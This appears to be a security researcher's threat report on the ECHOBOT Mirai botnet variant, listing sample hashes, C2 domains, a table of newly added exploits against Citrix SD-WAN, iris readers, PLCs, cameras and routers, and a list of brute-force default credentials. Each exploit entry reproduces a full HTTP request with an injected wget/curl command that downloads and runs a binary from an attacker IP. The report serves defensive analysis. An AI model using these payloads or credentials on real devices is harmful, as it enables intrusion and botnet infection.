A Mirai variant circulating under the name of ECHOBOT surfaced on 6th August 2019, containing a total of 57 unique exploits. While the majority of those exploits have already been seen in the wild in the past, a dozen are new additions to these particular samples, and the first known instance of them being employed by a piece of malware. This conforms to the trend seen with Mirai variants, even moreso with ECHOBOT, wherein authors have been testing the effectiveness of public exploits in terms of gains in bot count. Exploits that infect a greater number of devices are retained or reused in future variants whereas the less effective ones are retired or replaced with other exploits.

_Most notably, the new bunch of exploits includes two targeting Biometric Iris readers, and one targeting ethernet control system for PLCs. Also included is an exploit against certain Citrix SD-WAN devices, incorporated less than a month after the public release of the vulnerability and exploit._ Aside from those, other targeted devices are IP cameras, routers/gateways, and mostly server management/monitoring tools.

NB: Due to the payload script being faulty, the bots would not succeed at further propagating despite finding vulnerable devices.

IOCs & distinguishing features for these samples have been shared below. Previous research on the same variant can be found [here](https://unit42.paloaltonetworks.com/new-mirai-variant-adds-8-new-exploits-targets-additional-iot-devices/)

### Sample hashes
```
0116713cc067ced84b62a55c42218702d576558d3ac8a405703f57977d698d5e
09399b5e74a4493399a8d36e1b8a655b0f5c8407c838b03246c5852dd6f7f560
15f9419b3a3081b822ed75b4afad8f966e97e7f525e8e11e5ad138ff798d9a01
162b5c3300a62b1f79fbd2d29054c66bf581519c4cd30cba6fc3ea4c3abe84be
33ae648bdd89273906b0305eaf2e47e7cae55f1c0cde4cd4fd7f9d86d10b4136
7bc9df1d024873eb39636df225a8d38821ddb272a7d7412f5308717c66305daf
859076a44f01c68b6b256da515d32d741934990c614cc084e054d0db44fc343c
8cc01a1c17b18bbc8008139abbfbb5f82f36980bed34a88fa5b0991a70c79a1d
9b9aecd20bee9437e375436a7808c4d87661c1bbc424a40f6c2bf344591d4100
a45daaa2259a7b77b507abb1b415551bd8c96c64bf344ed48e09c779d37310f1
b0e83b4a0b75d791c870f643c50732aaee861ea4c4c8a92d431ae7a75346a3f9
c94d88f11b21277cc41b8b302a683a2e5df7346f5b340e31613a12d3172cf523
cb4b181327e0dbab67acef3e6708da26d003ad4bae86593287cfa7fb77bc0d2c
d1d8de0491248c38506e586f2d5dc11551354609c6c33ce0d36453997a7e4bd9
fc23196a03222392127e92e30efd6dc4c5a07fb96a9298038c8a629671807121
fcfee5fc93d49bad746ebc65be884b124b83b8003198d5bad4486722b105f6da
```

### C2s
```
akuma[.]pw:17
akumaiotsolutions[.]pw:912
```

### Exploits

New exploits in these samples seen for the first time in the wild

|*Vulnerability* | *Affected Devices* | *Exploit Format*|
|---|---|---|
|[CVE-2019-12989, CVE-2019-12991](https://www.exploit-db.com/exploits/47112)|Citrix SD-WAN Appliances (tested on 10.2.2)|```POST /sdwan/nitro/v1/config/get_package_file?action=file_download/cgi-bin/installpatch.cgi?swc-token=%d&installfile=`%s`' % '99999 cd /tmp; wget http://185.164.72.155/richard; curl -O http://185.164.72.155/richard; chmod +x richard; ./richard HTTP/1.1```<br>```'SSL_CLIENT_VERIFY' : 'SUCCESS'```<br>```get_package_fil:```<br>```site_name: 'blah' union select 'tenable','zero','day','research' INTO OUTFILE '/tmp/token_0';#,appliance_type: primary,package_type: active```<br><br>```User-Agent: Hello-World```<br>```Connection: keep-alive```|
|[EyeLock nano NXT Remote Code Execution](https://www.exploit-db.com/exploits/40228)| EyeLock NXT Biometric Iris Readers with firmware version 3.5|```GET /scripts/rpc.php?action=updatetime&timeserver=\|\|cd /tmp; wget http://185.164.72.155/richard; curl -O http://185.164.72.155/richard; chmod +x richard; ./richard HTTP/1.1```|
|[Iris ID IrisAccess ICU Cross-Site Scripting](https://www.exploit-db.com/exploits/40166)|Iris ID IrisAccess ICU 7000-2|```POST /html/SetSmarcardSettings.php HTTP/1.1```<br>```Content-Length: 11660```<br>```Content-Type: application/x-www-form-urlencoded```<br>```Connection: close```<br>```X-Powered-By: PHP/5.5.13```<br>```User-Agent: joxypoxy/7.2.6```<br><br>```HidChannelID=2&HidcmbBook=0&cmbBook=0|cd /tmp; wget http://185.164.72.155/richard; curl -O http://185.164.72.155/richard; chmod +x richard; ./richard+%23&HidDisOffSet=13&txtOffSet=37&HidDataFormat=1&HidDataFormatVal=1&DataFormat=1&HidFileAvailable=0&HidEncryAlg=0&EncryAlg=0&HidFileType=0&HidIsFileSelect=0&HidUseAsProxCard=0&HidVerForPHP=1.00.08```|
|[CVE-2015-4051](https://www.exploit-db.com/exploits/38514)|Beckhoff CX9020 PLCs|```POST /upnpisapi?uuid:+urn:beckhoff.com:serviceId:cxconfig HTTP/1.1```<br>```User-Agent: Hello-World```<br>```Host: 192.168.0.1:5120```<br>```Content-type: text/xml; charset=utf-8```<br>```SOAPAction: urn:beckhoff.com:service:cxconfig:1#Write```<br>```M-SEARCH * HTTP/1.1```<br>```HOST: 239.255.255.250:1900```<br>```MAN: ssdp:discover',0Dh,0Ah```<br>```MX: 3```<br>```ST: upnp:rootdevice```<br><br>```<?xml version="1.0" encoding="utf-8"?><s:Envelope s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><u:Write xmlns:u="urn:beckhoff.com:service:cxconfig:1"><netId></netId><nPort>0</nPort><indexGroup>0</indexGroup><IndexOffset>wget http://185.164.72.155/richard; curl -O http://185.164.72.155/richard; chmod +x richard; ./richard</IndexOffset><pData>AQAAAAAA</pData></u:Write></s:Body></s:Envelope>```|
|[Xfinity Gateway Remote Code Execution](https://www.exploit-db.com/exploits/40856)|Xfinity Gateways|```POST /actionHandler/ajax_network_diagnostic_tools.php HTTP/1.1```<br>```Host: 10.0.0.1:80```<br>```User-Agent: ```<br>```Accept: application/json, text/javascript, */*; q=0.01```<br>```Accept-Language: en-US,en;q=0.5```<br>```Accept-Encoding: gzip, deflate```<br>```Content-Type: application/x-www-form-urlencoded; charset=UTF-8```<br>```X-Requested-With: XMLHttpRequest```<br>```Referer: http://10.0.0.1/network_diagnostic_tools.php```<br>```Content-Length: 91```<br>```Cookie: PHPSESSID=; auth=```<br>```DNT: 1```<br>```X-Forwarded-For: 8.8.8.8```<br>```Connection: keep-alive```<br><br>```test_connectivity=true&destination_address=www.comcast.net || cd /tmp; wget http://185.164.72.155/richard; curl -O http://185.164.72.155/richard; chmod +x richard; ./richard; &count1=4```|
|[Beward N100 Authenticated Remote Code Execution](https://www.exploit-db.com/exploits/46319)|Beward N100 IP Cameras|```GET /cgi-bin/operator/servetest?cmd=cd /tmp; wget http://185.164.2.155/richard; curl -O http://185.164.72.155/richard; chmod +x richard; ./richard HTTP/1.1```<br>```Authorization: Basic YWRtaW46YWRtaW4=```<br>```Server: Boa/0.94.14rc21```<br>```Accept-Ranges: bytes```<br>```Connection: close```<br>```Content-type: text/plain```|
|[Fritz!Box Webcm Command Injection](https://www.exploit-db.com/exploits/32753) - this vulnerability was first briefly seen exploited by the Muhstik botnet in January 2018. This is the first instance of exploitation by a Mirai descendant.|Several versions of Fritz!Box devices|```GET /cgi-bin/webcm HTTP/1.1```<br><br>```var:lang&cd /tmp; wget http://185.164.72.155/richard; curl -O http://185.164.72.155/richard; chmod +x richard; ./richard```|
|[FLIR Thermal Camera Command Injection](https://www.exploit-db.com/exploits/42788)| Certain FC-Series S and PT-Series models of FLIR Cameras|```POST /page/maintenance/lanSettings/dns HTTP/1.1```<br>```Host: 192.168.0.1:80```<br>```Content-Length: 64```<br>```Accept: */*```<br>```Origin: http://192.168.0.1```<br>```X-Requested-With: XMLHttpRequest```<br>```User-Agent: Testingus/1.0```<br>```Content-Type: application/x-www-form-urlencoded```<br>```Referer: http://192.168.0.1/maintenance```<br>```Accept-Language: en-US,en;q=0.8,mk;q=0.6```<br>```Cookie: PHPSESSID=d1eabfdb8db4b95f92c12b8402abc03b```<br>```Connection: close```<br><br>```dns%5Bserver1%5D=8.8.8.8&dns%5Bserver2%5D=8.8.4.4%60cd /tmp; wget http://185.164.72.155/richard; curl -O http://185.164.72.155/richard; chmod +x richard; ./richard%60```|
|[Sapido RB-1732 Remote Command Execution](https://www.exploit-db.com/exploits/47031)|Sapido RB-1732 Wireless Routers | ```GET /goform/formSysCmd HTTP/1.1```<br>```('<textarea rows="15" name="msg" cols="80" wrap="virtual">')```<br>```('</textarea>')```<br><br>```{'sysCmd': cd /tmp; wget http://185.164.72.155/richard; curl -O http://185.164.72.155/richard; chmod +x richard; ./richard, 'apply': 'Apply', 'submit-url':'/syscmd.asp', 'msg':''}```|
|[CVE-2016-0752](https://www.exploit-db.com/exploits/40561)|Ruby on Rails multiple versions|```POST /users/%2f/%2fproc%2fself%2fcomm HTTP/1.1```<br>```Content-Type: multipart/form-data; boundary=```<br>```<%=`wget http://185.164.72.155/richard; curl -O http://185.164.72.155/richard -O /tmp/richard; chmod +x /tmp/richard; /tmp/richard`%>```|
|[CVE-2014-3914](https://www.exploit-db.com/exploits/33807)|Rocket ServerGraph 1.2 (tested on Windows 2008 R2 64 bits, Windows 7 SP1 32 bits and Ubuntu 12.04 64 bits)|```POST /SGPAdmin/fileRequest HTTP/1.1```<br>```&invoker=&title=&params=&id=&cmd=cd /tmp; wget http://185.164.72.155/richard; curl -O http://185.164.72.155/richard; chmod +x richard; ./richard&source=&query=```|
|[CVE-2015-2208](https://www.exploit-db.com/exploits/36251)|PHPMoAdmin installations|```POST /moadmin/moadmin.php HTTP/1.1```<br>```Host: 192.168.0.1:80```<br>```User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:36.0)Gecko/20100101 Firefox/36.0```<br>```Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8```<br>```Accept-Language: en-US,en;q=0.5```<br>```Accept-Encoding: gzip, deflate```<br>```DNT: 1```<br>```Connection: keep-alive```<br>```Pragma: no-cache```<br>```Cache-Control: no-cache```<br>```Content-Type: application/x-www-form-urlencoded```<br>```Content-Length: 34```<br><br>```object=1;system(wget http://185.164.72.155/richard; curl -O http:#//185.164.72.155/richard; chmod +x richard; ./richard);exit```|



#### Related AutoFocus Tags
* [Mirai](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Mirai)
* [XfinityGatewayRCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.XfinityGatewayRCE)
* [EyeLockNXT_RCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.EyeLockNXT_RCE)
* [IrisAccessICU_RCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.IrisAccessICU_RCE)
* [BewardN100RCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.BewardN100RCE)
* [FritzBoxCmdInjection](https://autofocus.paloaltonetworks.com/#/tag/Unit42.FritzBoxCmdInjection)
* [FLIRFCSPT_RCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.FLIRFCSPT_RCE)
* [SapidoRB1732_RCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.SapidoRB1732_RCE)
* [CVE-2016-0752](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2016-0752)
* [CVE-2014-3914](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2014-3914)
* [CVE-2015-4051](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2015-4051)
* [CVE-2015-2208](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2015-2208)


#### Other exploits in the samples (along with function names in unstripped binaries):
* [CVE-2009-2288](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2009-2288) - nagiosscan
* [EnGenius RCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.EnGeniusRCE) - cloudscan
* [CVE-2018-7297](https://www.exploit-db.com/exploits/45052) - homematicscan
* [SpreeCommerceRCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.SpreecommerceRCE) - spreecommercescan
* [RedmineRCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.RedmineRCE) - redminescan
* [CVE-2003-0050](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2003-0050) - quicktimescan
* [CVE-2011-3587](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2011-3587) - plonescan
* [CVE-2005-2773](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2005-2773) - openviewscan
* [OP5MonitorRCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.OP5MonitorRCE) - op5v7scan
* [CVE-2012-0262](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2012-0262) - op5scan
* [MitelAWC_RCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.MitelAWC_RCE) - mitelscan
* [GitoriousRCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.GitoriousRCE) - gitoriousscan
* [CVE-2012-4869](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2012-4869) - freepbxscan
* [CVE-2011-5010](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2011-5010) - ctekscan
* [DogfoodCRM_RCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.DogfoodCRM_RCE) - crmscan
* [CVE-2005-2848](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2005-2848) - barracudascan
* [CVE-2006-2237](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2006-2237) - awstatsmigratescan
* [CVE-2005-0116](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2005-0116) - awstatsconfigdirscan
* [CVE-2008-3922](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2008-3922) - awstatstotalsscan
* [CVE-2007-3010](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2007-3010) - alcatelscan
* [CVE-2009-0545](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2009-0545) - zeroshellscan
* [CVE-2013-5758](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2013-5758) - yealinkscan
* [CVE-2016-10760](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2016-10760) - seowonintechscan
* [CVE-2009-5157](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2009-5157) - linksysscan
* [CVE-2009-2765](https://www.exploit-db.com/exploits/9209) - ddwrtscan
* [CVE-2010-5330](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2010-5330) - airosscan
* [CVE-2009-5156](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2009-5156) - asmaxscan 
* [GoAheadRCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.GoAheadRCE) - wificamscan
* [CVE-2017-5174](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2017-5174) - geutebruckscan
* [CVE-2018-6961](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2018-6961) - vmwarescan
* [CVE-2018-11510](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2018-11510) - admscan
* [OpenDreamBox_RCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.OpenDreamBox_RCE) - dreamboxscan
* [WePresentCmdInjection](https://autofocus.paloaltonetworks.com/#/tag/Unit42.WePresentCmdInjection) - wepresentscan
* [CVE-2018-17173](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2018-17173) - supersignscan
* [CVE-2019-2725](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2019-2725) - oraclescan
* [NetgearReadyNAS_RCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.NetgearReadyNAS_RCE) - nuuoscan & netgearscan
* [CVE-2018-20841](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2018-20841) - hootooscan
* [DellKACE_SysMgmtApp_RCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.DellKACE_SysMgmtApp_RCE) - dellscan
* [CVE-2018-7841](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2018-7841) - umotionscan
* [CVE-2016-6255](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2016-6255) - veralite_init
* [CVE-2019-3929](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2019-3929) - Blackboxscan
* [CVE-2019-12780](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2019-12780) - belkin_init
* [CVE-2014-8361](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2014-8361) - realtekscan & dlinkscan
* [ASUSModemRCEs](https://autofocus.paloaltonetworks.com/#/tag/Unit42.ASUSModemRCE) (CVE-2013-5948, CVE-2018-15887) - asuswrtscan & asusscan

### Default Credentials
The following are unusual Default Credentials for brute force that I haven't previously seen used by a Mirai variant:
```connect/
admin/firetide
mysweex/mysweex
hame/
admin/hsparouter
root/aaaaaa
211cmw91765/
cable/
admin/arrowpoint
admin/airlive
public/
admin/urchin
AdvWebadmin/advcomm500349
admin/readwrite
status/readonly
root/skyboxview
rainbow/
admin/allot
gonzo/
admin/publish
root/tooridu
root/trendmsa1.0
admin/AlpheusDigital1010```
